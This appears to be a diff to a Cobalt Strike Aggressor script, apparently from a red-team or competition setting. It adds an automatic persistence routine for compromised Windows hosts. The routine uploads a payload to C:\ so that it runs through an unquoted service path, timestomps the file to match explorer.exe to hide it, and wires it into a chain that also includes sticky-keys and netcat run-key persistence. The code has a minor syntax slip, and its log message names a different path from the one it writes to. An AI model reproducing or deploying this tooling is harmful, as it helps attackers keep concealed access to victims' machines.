@@ -161,14 +161,38 @@ sub persist_diagsvc {
         }
     }    
 }
+sub persist_unquotepath {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("program.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd(($1, 'c:\');
+            bupload($1, script_resource("program.exe"));
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program.exe not found");
+        }
+    }
+    else {
+        if (-exists script_resource("program32.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd(($1, 'c:\');
+            bupload($1, script_resource("program32.exe"));
+            bshell($1, "move c:\\program32.exe c:\\program.exe");
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program32.exe not found");
+        }
+    }
+}
 sub persistence {
     #if (some check == true then break before persisting
     persist_linkinfo($1);
-    persist_scorebot($1);
     persist_runkey_ie($1);
     persist_runkey_netcat($1);
     stickykeys($1);
-    persist_diagsvc($1);
+    persist_unquotepath($1);
 }
 on beacon_initial {
     bsleep($1, 15, 50);
